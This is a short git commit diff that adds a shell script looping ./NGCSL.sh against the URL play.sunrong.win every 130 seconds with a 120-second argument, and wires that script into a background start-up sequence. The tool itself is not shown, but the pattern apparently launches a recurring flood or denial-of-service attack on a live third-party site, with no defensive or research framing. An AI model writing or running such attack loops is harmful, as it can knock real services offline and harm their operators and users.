21813a07cdab3536a5ae99777bbaeaf40c30b980
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-05-26 22:03:19 +0700

    hehe

---
+++ run.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+while true; do
+  ./NGCSL.sh https://play.sunrong.win/ 120
+  sleep 130
+done
--- start.sh
+++ start.sh
@@ -4,8 +4,11 @@ export NODE_OPTIONS=--max-old-space-size=102400
 
 node ok.js &
 
+
 ./monitor.sh &
 
-sleep 500
+./run.sh &
+
+sleep 530
 
 ./setup.sh
